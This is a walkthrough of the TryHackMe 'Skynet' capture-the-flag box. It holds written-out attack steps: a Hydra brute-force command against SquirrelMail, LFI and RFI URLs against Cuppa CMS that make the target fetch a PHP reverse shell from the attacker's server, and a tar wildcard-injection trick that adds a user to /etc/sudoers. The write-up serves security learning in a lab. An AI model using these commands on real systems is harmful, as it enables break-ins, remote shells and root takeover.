Skynet TryHackMe Walkthrough

Introduction
This was an easy Linux box that involved accessing an open SMB share containing a list of credentials that could be used to bruteforce a SquirrelMail web application, finding SMB credentials on the application to access a new share which revealed a second web application, and exploiting a remote file inclusion vulnerability in Cuppa CMS to gain remote access. Privilege escalation was possible due to a misconfigured cron job running as root and using a wildcard with the tar command.

Enumeration
The first thing to do is to run a TCP Nmap scan against the 1000 most common ports, and using the following flags:

-sC to run default scripts
-sV to enumerate applications versions
-Pn to skip the host discovery phase, as some hosts will not respond to ping requests
-oA to save the output in all formats available
![image](https://user-images.githubusercontent.com/71508714/169668306-429f63c0-fa69-4b4d-b5fc-68f43121ed3d.png)

We can see that we have several open ports on this machine:

Port 22 — SSH, not worth to check it for now
Port 80 — A web page running a search website
Port 110 — POP3, prolly a mail server
Port 143 — IMAP, prolly also part of the mail server
Port 139/445 — SMB ports, this is a good starting point
![image](https://user-images.githubusercontent.com/71508714/169668382-80739b1e-7dba-48a7-a0e0-b8f03a9ca885.png)

By checking the directories, we found the login page of the mail server:
![image](https://user-images.githubusercontent.com/71508714/169668447-26c8ef56-04b8-42e5-9d00-78b46641cb70.png)

Tried hydra & sqlinject but nothing have happen.

Enumerating SMB:

SMB eumeration can be done by nmap scripts also.
![image](https://user-images.githubusercontent.com/71508714/169668548-7e0527ee-b3ab-4c22-be7d-b66797b8762d.png)
![image](https://user-images.githubusercontent.com/71508714/169668583-2bbdc350-322c-4c55-b45e-686c8f278f21.png)

Using the SMBClient tool to list the open shares on the host:

![image](https://user-images.githubusercontent.com/71508714/169668655-ef9020a5-b3be-4e4a-bfe3-b5f929217871.png)
Connecting to the “anonymous” share, this contains a text file and a “logs” folder, containing three log files. Downloading all of the files locally to furhter examine them:

![image](https://user-images.githubusercontent.com/71508714/169668686-0af707e1-bb8b-4f09-a1cc-2ee066fb2a14.png)

The “attention.txt” file contains a note that mentions a password change in the organization, whereas the logs contain what looks like a word list of some sort, potentially from an authentication log:

![image](https://user-images.githubusercontent.com/71508714/169668742-3ff023a7-eddf-4850-a3bb-f4be6018b9c3.png)

While ‘log2.txt’ and ‘log3.txt’ are empty, ‘log1.txt’ appears to have some kind of list of usernames or passwords. Also the milesdyson share is not accessible, but we can try to use the name on the mail server and the list as a password list.

We can use something like Hydra to try to brute force it or burp intruder. First, let’s save the list in a file that we can use. Second we need to make an attempt to login and get the POST url:

![image](https://user-images.githubusercontent.com/71508714/169669138-f9b35b7d-be53-49ef-8714-23a72e0de60f.png)

After a couple of tries, we finally get a working command. Now let’s try to use Hydra to brute force it using the provided list:

hydra -l milesdyson -P log1.txt 10.10.174.36 -V http-form-post ‘/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.’

And after running, we get a hit:

![image](https://user-images.githubusercontent.com/71508714/169669191-9e6a5984-9d6a-41b6-a440-764b05724701.png)

So let’s try to login with the newly found credentials:

![image](https://user-images.githubusercontent.com/71508714/169669217-95957a31-0a3a-403e-92f8-f2b59655215f.png)

Now we can answer the first question in the task “What is Miles password for his emails?” with the password found in ‘log1.txt’.

By checking the emails, we found an email regarding a reset password (remember the previous attention.txt file?):

![image](https://user-images.githubusercontent.com/71508714/169669261-e3b2c913-9ed5-4a27-9d81-e37b4e16f289.png)

Ok, heading back to the smb shares, we can now try to access the milesdyson share using the username milesdyson and the new password:

![image](https://user-images.githubusercontent.com/71508714/169669298-882b6dd1-1446-4b33-87ec-dd05fd376662.png)

![image](https://user-images.githubusercontent.com/71508714/169669334-e95091dd-7d6f-46aa-a4a1-e667e6ac1671.png)

![image](https://user-images.githubusercontent.com/71508714/169669363-eef16619-a937-4a7e-8ce9-41a0133fe09e.png)

Ok we found a bunch of .pdf files and a ‘notes’ directory. Inside there is a bunch of .md files and a text file called ‘important.txt’. Let’s check that file:

![image](https://user-images.githubusercontent.com/71508714/169669395-65eabb52-d0e7-4ad7-b815-be2aa1a2c601.png)

Interesting! We have some sort of directory in the file. Let’s try to access that on the main web page:

![image](https://user-images.githubusercontent.com/71508714/169669417-d814f201-f368-44e8-9c0e-bb94d6341c81.png)

Ok, we can now answer the question “What is the hidden directory?” with the value of the new found directory.

Let’s to do another Gobuster search in the new found webpage, to see if we get some new results:

![image](https://user-images.githubusercontent.com/71508714/169669444-48cee6e7-7141-4c91-8694-56cbc483012d.png)


Checking the new directory, we are presented with a login page for a Cuppa CMS platform:

![image](https://user-images.githubusercontent.com/71508714/169669489-7009e72f-4ac7-4445-b5e7-e721be811134.png)

Not having a clear attack vector for now, the best choice is to try to check if the said version of the CMS has some known vulnerabilities that we can take advantage of.

While searching, we manage to find the oficial documentation of the CMS here, which mentions that the default credentials are ‘admin’:’admin’, but those do not work.

Searching for RFI vulnerabilities affecting Cuppa CMS leads to https://www.exploit-db.com/exploits/25971.:

![image](https://user-images.githubusercontent.com/71508714/169669532-b8d86694-812c-4ce5-beb4-0b1c30fab592.png)

After reading the exploit and tweaking a little bit of the url, we call the following URL:

http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
And list the /etc/passwd file, so the exploit is working:

![image](https://user-images.githubusercontent.com/71508714/169669563-b7b11be9-fe4d-4e51-8769-9d79b73090fe.png)


So Local File Inclusion is possible, but in order to get a foothold on the server, we need to use a Remote File Inclusion attack. The main difference is that in the Local File Inclusion, local files are used while in the Remote File Inclusion, as the name implies, remote files are used instead, allowing us to pass an url with a script to be executed.

Let’s first create a small one line reverse shell file, using the following code, replacing IP and Port with your IP address and a Port to be used in our reverse shell listener:

Copying the php reverseshell from https://pentestmonkey.net/

![image](https://user-images.githubusercontent.com/71508714/169669716-e3da5738-8220-40a6-a7cc-74cf5a0011a3.png)

After this, let’s set up a netcat listener on the Port defined .

![image](https://user-images.githubusercontent.com/71508714/169669756-fdc4d956-fb31-4d33-8602-505759f6629e.png)


Now we need to put an http server up in the air, on the directory where we have the reverse shell code, using Python:

sudo Python3 -m http.server 80

![image](https://user-images.githubusercontent.com/71508714/169669752-3e654633-293f-4f24-a8d7-8c6637332649.png)

Now, open the following URL in your browser: http://10.10.67.236/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.50.72:8000/php-reverse-shell.php. You should have a reverse shell:

![image](https://user-images.githubusercontent.com/71508714/169669792-f7c3feb6-e188-4cbd-af20-7265658774fa.png)

Privilege Escalation

So my usual steps into enumerate linux boxes usually are to check for sudo permissions, crontab jobs running and to get a linpeas script and run an automated enumeration in order to look for clues.

Since we have a dumb shell, we need to upgrade it to a interactive tty shell, using the following Python command:

python -c ‘import pty;pty.spawn(“/bin/bash”)’

We can check for the sudo permissions with the sudo -l command:

![image](https://user-images.githubusercontent.com/71508714/169669821-f9513c05-676a-4705-a902-7600a2914d8a.png)

So we don’t have permissions to check if we can run something as sudo. Let’s try to enumerate crontab instead:

![image](https://user-images.githubusercontent.com/71508714/169669839-52deec70-ef67-4e11-8868-2741b5c98057.png)

Ok, we can see that there is some backup.sh running every minute. Let’s check the permissions on that folder or script:

![image](https://user-images.githubusercontent.com/71508714/169669856-5268ab18-203a-4516-af2a-e3c179c2b896.png)


![image](https://user-images.githubusercontent.com/71508714/169669873-bca0ab95-08d9-4f65-9853-f5b3144793e7.png)

o as we can see, this script runs as root, changes directory to ‘/var/www/html’ and then uses tar to compress the content of the directory into a file called backup.tgz at ‘/home/milesdyson/backups’.

We could check for a possible attack vector, in the gtfobins page but since only the script is allowed to run tar as root, there is not much we can use from there. After a couple of searches, I’ve found a potential Linux privilege escalation using wildcard injection. Basically, tar allows the usage of 2 options that can be used for poisoning, in order to force the binary to execute unintended actions:

checkpoint[=NUMBER] — this option displays progress messages every NUMBERth record (default value is 10)
checkpoint-action=ACTION — this option executes said ACTION on each checkpoint
By forcing tar to use these options, we can use a specific action with the permissions of the user that is running the command, which in our case is root.

So, in order to take advantage of this, let’s create a script to add our user to sudoers and gain root while on the machine:

echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
touch "/var/www/html/--checkpoint=1"

After running all three commands in our /var/www/html, we should have 3 new files laying around inside the directory that is getting backed up:

![image](https://user-images.githubusercontent.com/71508714/169669902-6a192e41-9a4a-4a4e-9c3a-124a6d9196d3.png)

Now, after a minute, the cronjob should have been executed, and we can get our root access by just using sudo su:

![image](https://user-images.githubusercontent.com/71508714/169669920-d3b2cac6-4f12-492c-a943-0bf64c12cf4a.png)


Overall, this machine was super fun, with a really cool enumeration phase. Probably there is another way of escalating our privileges, but this seemed an easy way of doing it.

I hope you enjoyed reading this post as much as I enjoyed writing it. Let me know in the comments if something is wrong or missing, as I am still learning myself and feedback is always welcomed :)



